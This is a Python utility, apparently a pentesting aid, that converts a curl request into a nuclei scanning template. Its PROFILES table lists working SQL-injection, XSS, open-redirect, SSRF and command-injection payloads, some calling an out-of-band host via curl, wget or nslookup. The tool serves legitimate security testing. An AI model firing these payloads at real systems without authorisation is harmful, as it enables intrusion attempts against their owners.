"""curl2nuclei — turn a curl command into a runnable nuclei YAML template.

The point is not to print pretty info about a request. The point is to hand
back a YAML file you immediately run with `nuclei -t out.yaml -u <target>`.
"""

import argparse
import os
import shlex
import sys
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class CurlReq:
    method: str = "GET"
    url: str = ""
    headers: list[tuple[str, str]] = field(default_factory=list)
    cookies: list[tuple[str, str]] = field(default_factory=list)
    body: str | None = None
    body_kind: str = "form"  # form | json | raw

    @property
    def host(self) -> str:
        return urllib.parse.urlparse(self.url).netloc

    @property
    def path_with_query(self) -> str:
        u = urllib.parse.urlparse(self.url)
        return u.path + (f"?{u.query}" if u.query else "")


def parse_curl(text: str) -> CurlReq:
    text = text.strip().replace("\\\n", " ").replace("\\\r\n", " ")
    tokens = shlex.split(text)
    if tokens and tokens[0] in ("curl", "/usr/bin/curl"):
        tokens = tokens[1:]

    req = CurlReq()
    i = 0
    while i < len(tokens):
        t = tokens[i]
        if t in ("-X", "--request"):
            req.method = tokens[i + 1].upper()
            i += 2
        elif t in ("-H", "--header"):
            k, _, v = tokens[i + 1].partition(":")
            req.headers.append((k.strip(), v.strip()))
            i += 2
        elif t in ("-b", "--cookie"):
            for pair in tokens[i + 1].split(";"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    req.cookies.append((k.strip(), v.strip()))
            i += 2
        elif t in ("-d", "--data", "--data-raw", "--data-binary"):
            req.body = tokens[i + 1]
            req.body_kind = "form"
            if req.method == "GET":
                req.method = "POST"
            i += 2
        elif t == "--data-urlencode":
            req.body = (req.body + "&" if req.body else "") + tokens[i + 1]
            req.body_kind = "form"
            if req.method == "GET":
                req.method = "POST"
            i += 2
        elif t in ("--json",):
            req.body = tokens[i + 1]
            req.body_kind = "json"
            req.headers.append(("Content-Type", "application/json"))
            if req.method == "GET":
                req.method = "POST"
            i += 2
        elif t in ("-u", "--user"):
            import base64

            enc = base64.b64encode(tokens[i + 1].encode()).decode()
            req.headers.append(("Authorization", f"Basic {enc}"))
            i += 2
        elif t in ("-A", "--user-agent"):
            req.headers.append(("User-Agent", tokens[i + 1]))
            i += 2
        elif t in ("-e", "--referer"):
            req.headers.append(("Referer", tokens[i + 1]))
            i += 2
        elif t in ("-G", "--get"):
            req.method = "GET"
            i += 1
        elif t.startswith("-"):
            i += 2 if i + 1 < len(tokens) and not tokens[i + 1].startswith("-") else 1
        else:
            if not req.url:
                req.url = t
            i += 1

    if not req.url:
        raise ValueError("no URL found in curl command")
    return req


PROFILES = {
    "sqli": {
        "payloads": ["'", "''", "' OR '1'='1", "1 AND SLEEP(7)--", "1' AND 1=CONVERT(int,@@version)--"],
        "matchers": [
            {"type": "regex", "regex": ["SQL syntax", "mysql_fetch", "ORA-[0-9]{5}", "PostgreSQL.*ERROR", "Microsoft OLE DB", "Unclosed quotation mark"]},
            {"type": "status", "status": [500]},
        ],
        "matcher_condition": "or",
    },
    "ssrf": {
        "oob": True,
        "payloads": ["http://{{interactsh-url}}", "http://{{interactsh-url}}/x", "//{{interactsh-url}}"],
        "matchers": [
            {"type": "word", "part": "interactsh_protocol", "words": ["dns", "http"]},
        ],
    },
    "xss": {
        "payloads": ["<sCript>alert`{{randstr}}`</sCript>", "\"><svg/onload=confirm({{randstr}})>", "javascript:confirm({{randstr}})"],
        "matchers": [
            {"type": "word", "part": "body", "words": ["{{payload}}"], "case_insensitive": True},
            {"type": "word", "part": "header", "words": ["text/html"]},
        ],
        "matcher_condition": "and",
    },
    "redirect": {
        "payloads": ["//evil.example", "/\\evil.example", "https://evil.example", "%2f%2fevil.example", "/.evil.example"],
        "matchers": [
            {"type": "regex", "part": "header", "regex": ["(?i)location:\\s*(https?:)?//evil\\.example"]},
            {"type": "status", "status": [301, 302, 303, 307, 308]},
        ],
        "matcher_condition": "and",
    },
    "rce": {
        "oob": True,
        "payloads": [";curl http://{{interactsh-url}}", "|nslookup {{interactsh-url}}", "$(curl http://{{interactsh-url}})", "`wget {{interactsh-url}}`"],
        "matchers": [
            {"type": "word", "part": "interactsh_protocol", "words": ["dns", "http"]},
        ],
    },
    "time-based": {
        "payloads": ["1' AND SLEEP(7)--", "1) WAITFOR DELAY '0:0:7'--", "$(sleep 7)", "; sleep 7;"],
        "matchers": [
            {"type": "dsl", "dsl": ["duration>=6"]},
        ],
    },
}


def yaml_dump(req: CurlReq, profile_name: str, profile: dict, fuzz_param: str | None, slug: str) -> str:
    lines: list[str] = []
    lines.append(f"id: {slug}")
    lines.append("")
    lines.append("info:")
    lines.append(f"  name: {profile_name.upper()} probe on {req.host}{req.path_with_query.split('?')[0]}")
    lines.append("  author: curl2nuclei")
    sev = {"sqli": "high", "rce": "critical", "ssrf": "high", "xss": "medium", "redirect": "medium", "time-based": "high"}[profile_name]
    lines.append(f"  severity: {sev}")
    lines.append(f"  description: Generated from a captured curl request — fuzzes {fuzz_param or 'every parameter'} for {profile_name}.")
    lines.append("  tags: " + ",".join(["curl2nuclei", profile_name]))
    lines.append("")

    raw_lines = _build_raw_request(req, fuzz_param)
    lines.append("http:")
    lines.append("  - raw:")
    lines.append("      - |")
    for rl in raw_lines:
        lines.append(f"        {rl}")
    lines.append("")
    lines.append("    payloads:")
    lines.append("      payload:")
    for p in profile["payloads"]:
        lines.append(f"        - {_yaml_quote(p)}")
    lines.append("    attack: pitchfork")
    lines.append("    stop-at-first-match: true")
    lines.append("")
    cond = profile.get("matcher_condition", "or")
    lines.append(f"    matchers-condition: {cond}")
    lines.append("    matchers:")
    for m in profile["matchers"]:
        lines.append(f"      - type: {m['type']}")
        if "part" in m:
            lines.append(f"        part: {m['part']}")
        if "status" in m:
            statuses = ", ".join(str(s) for s in m["status"])
            lines.append(f"        status: [{statuses}]")
        if "words" in m:
            lines.append("        words:")
            for w in m["words"]:
                lines.append(f"          - {_yaml_quote(w)}")
        if "regex" in m:
            lines.append("        regex:")
            for r in m["regex"]:
                lines.append(f"          - {_yaml_quote(r)}")
        if "dsl" in m:
            lines.append("        dsl:")
            for d in m["dsl"]:
                lines.append(f"          - {_yaml_quote(d)}")
        if m.get("case_insensitive"):
            lines.append("        case-insensitive: true")
    return "\n".join(lines) + "\n"


def _yaml_quote(s: str) -> str:
    return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'


def _build_raw_request(req: CurlReq, fuzz_param: str | None) -> list[str]:
    pq = req.path_with_query or "/"
    pq = _inject(pq, fuzz_param, in_query=True)
    out = [f"{req.method} {pq} HTTP/1.1", f"Host: {req.host}"]
    seen_host = False
    for k, v in req.headers:
        if k.lower() == "host":
            seen_host = True
            continue
        out.append(f"{k}: {v}")
    if req.cookies:
        cookie = "; ".join(f"{k}={v}" for k, v in req.cookies)
        out.append(f"Cookie: {cookie}")
    if req.body and not any(k.lower() == "content-type" for k, _ in req.headers):
        ctype = "application/json" if req.body_kind == "json" else "application/x-www-form-urlencoded"
        out.append(f"Content-Type: {ctype}")
    out.append("")
    if req.body:
        out.append(_inject(req.body, fuzz_param, in_query=False))
    if not seen_host:
        pass  # already added
    return out


def _inject(s: str, fuzz_param: str | None, in_query: bool) -> str:
    if not s:
        return s
    if fuzz_param is None:
        # mark every key=value with the payload placeholder
        sep = "&"
        if in_query and "?" in s:
            base, _, qs = s.partition("?")
            return base + "?" + sep.join(_mark(p) for p in qs.split(sep))
        if not in_query and "=" in s:
            return sep.join(_mark(p) for p in s.split(sep))
        return s
    parts = []
    sep = "&"
    target_left = s
    prefix = ""
    if in_query and "?" in s:
        prefix, _, target_left = s.partition("?")
        prefix += "?"
    for p in target_left.split(sep):
        if "=" in p:
            k, v = p.split("=", 1)
            if k == fuzz_param:
                parts.append(f"{k}={{{{payload}}}}")
                continue
        parts.append(p)
    return prefix + sep.join(parts)


def _mark(p: str) -> str:
    if "=" in p:
        k, _ = p.split("=", 1)
        return f"{k}={{{{payload}}}}"
    return p


def _slug(req: CurlReq, profile_name: str) -> str:
    host = req.host.replace(".", "-")
    path = urllib.parse.urlparse(req.url).path.strip("/").replace("/", "-") or "root"
    return f"{profile_name}-{host}-{path}"[:80]


def render_next_step(req: CurlReq, out_path: str) -> str:
    """Bottom-of-output box-panel that tells the user the next command to run.

    Visually distinct from a table — single bordered panel, no columns.
    """
    use_color = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
    cmd = f"nuclei -t {out_path} -u {req.url.split('?')[0]}"
    written = f"written: {out_path}"
    title = "next step"
    contents = [cmd, "", written]
    inner_w = max(len(c) for c in contents + [title + "  "]) + 2  # padding 1 each side

    if use_color:
        head = "\033[1;36m"
        body = "\033[0;36m"
        rst = "\033[0m"
    else:
        head = body = rst = ""

    title_segment = f"─ {title} "
    top = f"┌{title_segment}{'─' * (inner_w - len(title_segment))}┐"
    bot = f"└{'─' * inner_w}┘"
    rows = [f"│ {c:<{inner_w - 2}} │" for c in contents]
    return "\n".join([f"{head}{top}{rst}", *(f"{body}{r}{rst}" for r in rows), f"{head}{bot}{rst}"])


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(
        prog="curl2nuclei",
        description="Convert a captured curl command into a runnable nuclei YAML template.",
    )
    p.add_argument("--curl", required=True, help="curl command string, or @path/to/file")
    p.add_argument(
        "--class",
        dest="vclass",
        required=True,
        choices=sorted(PROFILES.keys()),
        help="vulnerability class to generate the template for",
    )
    p.add_argument("--param", help="single parameter name to fuzz (default: every parameter)")
    p.add_argument("--out", help="write template here (default: ./<id>.yaml)")
    p.add_argument("--stdout", action="store_true", help="print YAML to stdout, do not write a file")
    args = p.parse_args(argv)

    raw = args.curl
    if raw.startswith("@"):
        try:
            raw = Path(raw[1:]).read_text()
        except OSError as exc:
            print(f"error: cannot read curl file: {exc}", file=sys.stderr)
            return 1
    try:
        req = parse_curl(raw)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    profile = PROFILES[args.vclass]
    slug = _slug(req, args.vclass)
    yaml_text = yaml_dump(req, args.vclass, profile, args.param, slug)

    if args.stdout:
        sys.stdout.write(yaml_text)
        return 0

    out_path = args.out or f"./{slug}.yaml"
    try:
        Path(out_path).write_text(yaml_text)
    except OSError as exc:
        print(f"error: cannot write {out_path}: {exc}", file=sys.stderr)
        return 2

    sys.stdout.write(yaml_text)
    sys.stdout.write("\n")
    sys.stdout.write(render_next_step(req, out_path))
    sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
